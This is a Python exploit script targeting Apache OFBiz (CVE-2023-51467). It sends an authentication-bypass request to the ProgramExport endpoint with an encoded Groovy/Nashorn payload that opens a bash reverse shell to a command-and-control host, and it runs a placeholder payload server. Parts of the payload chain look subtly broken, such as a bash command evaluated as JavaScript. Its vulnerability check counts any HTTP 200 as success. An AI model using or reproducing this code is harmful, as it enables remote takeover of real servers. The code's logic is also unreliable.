import base64
import random
import string
import requests
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import argparse


class OFBizExploit:
    def __init__(self, target_host, target_port, c2_host="127.0.0.1", c2_port=4444):
        self.target_host = target_host
        self.target_port = target_port
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.payload = ""

    def generate_payload(self):
        reverse_shell = f"bash -i >& /dev/tcp/{self.c2_host}/{self.c2_port} 0>&1"
        encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
        nashorn_script = f"""
        import javax.script.*;
        ScriptEngineManager factory = new ScriptEngineManager();
        ScriptEngine engine = factory.getEngineByName("nashorn");
        try {{
            engine.eval(new java.lang.String(java.util.Base64.getDecoder().decode("{encoded_shell}")));
        }} catch (final ScriptException se) {{
            se.printStackTrace();
        }}
        """
        self.payload = base64.b64encode(nashorn_script.encode()).decode()

    def exploit(self):
        print("[*] Generating payload...")
        self.generate_payload()

        groovy_payload = f'groovyProgram=x="\\"{self.payload}\\".de";Eval.me(new String(Eval.me("${{x}}codeBase64()")));'
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": f"{self.target_host}:{self.target_port}",
        }
        params = f"?requirePasswordChange=Y&PASSWORD={self.random_string(8)}&USERNAME={self.random_string(8)}"
        url = f"http://{self.target_host}:{self.target_port}/webtools/control/ProgramExport/{params}"

        print(f"[*] Sending exploit to {url}...")
        try:
            response = requests.post(url, headers=headers, data=groovy_payload, timeout=10)
            if response.status_code == 200:
                print("[+] Exploit sent successfully. Check your C2 listener.")
                return True
            else:
                print(f"[-] Exploit failed. HTTP Status Code: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Exploit failed with error: {e}")
            return False

    def start_http_server(self):
        class RequestHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Payload served.")
                print("[*] Payload served.")

        http_server = HTTPServer((self.c2_host, 8080), RequestHandler)
        print(f"[*] Starting HTTP server at {self.c2_host}:8080...")
        http_server.serve_forever()

    def random_string(self, length):
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache OFBiz CVE-2023-51467 Exploit.")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., 'localhost:8080').")
    args = parser.parse_args()

    target_host, target_port = args.url.split(":")
    target_port = int(target_port)

    print("[*] Running Apache OFBiz Exploit (CVE-2023-51467)...")

    exploit = OFBizExploit(target_host, target_port)

    # Start HTTP server
    http_thread = Thread(target=exploit.start_http_server, daemon=True)
    http_thread.start()

    # Execute exploit
    time.sleep(2)  # Allow HTTP server to start
    if exploit.exploit():
        print("Detected Vulnerability : True")
    else:
        print("Detected Vulnerability : False")